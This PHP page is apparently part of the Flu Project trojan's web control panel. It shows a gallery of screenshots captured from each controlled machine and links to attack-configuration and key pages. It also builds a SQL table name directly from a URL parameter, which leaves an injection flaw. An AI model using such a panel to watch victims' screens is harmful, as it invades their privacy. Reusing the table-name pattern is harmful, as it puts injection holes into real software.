<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link rel="stylesheet" type="text/css" href="../style-projects-jquery.css" />    

    <!-- Arquivos utilizados pelo jQuery lightBox plugin -->
    <script type="text/javascript" src="js/jquery.js"></script>
    <script type="text/javascript" src="js/jquery.lightbox-0.5.js"></script>
    <link rel="stylesheet" type="text/css" href="css/jquery.lightbox-0.5.css" media="screen" />
    <!-- / fim dos arquivos utilizados pelo jQuery lightBox plugin -->
    
    <!-- Ativando o jQuery lightBox plugin -->
    <script type="text/javascript">
    $(function() {
        $('#gallery a').lightBox();
    });
    </script>
   	<style type="text/css">
	/* jQuery lightBox plugin - Gallery style */
	#gallery {
		background-color: #444;
		padding: 10px;
		width: 520px;
	}
	#gallery ul { list-style: none; }
	#gallery ul li { display: inline; }
	#gallery ul img {
		border: 5px solid #3e3e3e;
		border-width: 5px 5px 20px;
	}
	#gallery ul a:hover img {
		border: 5px solid #fff;
		border-width: 5px 5px 20px;
		color: #fff;
	}
	#gallery ul a:hover { color: #fff; }
	body {
	  background-image: url("images/fondo.png");
	  background-color: #000000;
	  background-repeat: repeat-x;
	}
	</style>
</head>

<body>
<br/><div align="center"></a><a href="http://www.flu-project.com"><img src="images/banner-servidor-web-flu.png" border="none"/></a></div><br/>
<div align="center" width="100%"><a href="menuPrincipal.php"><img src="images/boton-menu-principal.png" border="none"/></a>
<a href="configurar-ataque.php"><img src="images/boton-configurar-ataque.png" border="none"/></a>
<a href="configurar-claves.php"><img src="images/claves1.png" border="none"/></a>
<a href="gestionar-usuarios.php"><img src="images/user1.png" border="none"/></a>
<a href="logout.php"><img src="images/logout.png" border="none"/></a>
</div>
<div align="center">
<h2 id="example">Capturas de pantalla - Seleccione una imágen para ampliarla</h2>
<div id="gallery">
    <ul>
<?php
//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
error_reporting(0);

include "conexion-bbdd.php";
	
function filtrar($variable)
{
	return addcslashes(mysql_real_escape_string($variable),',<>');
}
	
	$result = mysql_query("SELECT id FROM t_imagenes_".str_replace(array("."),array("_"),filtrar($_GET['maquina'])));
	while ($registro = mysql_fetch_array($result)){
		echo '<li>';
		echo '<a href="verImagenes.php?maquina=' . filtrar($_GET['maquina']) . '&id=' . $registro['id'] . '" title="Captura de pantalla">';
		echo '<img src="verImagenes.php?maquina=' . filtrar($_GET['maquina']) . '&id=' . $registro['id'] . '" width="100" alt="" />';
		echo '</a>';
        echo '</li>';
	}
	include "cerrar-conexion-bbdd.php";
?> 
    </ul>
</div>
</div>
</body>
</html>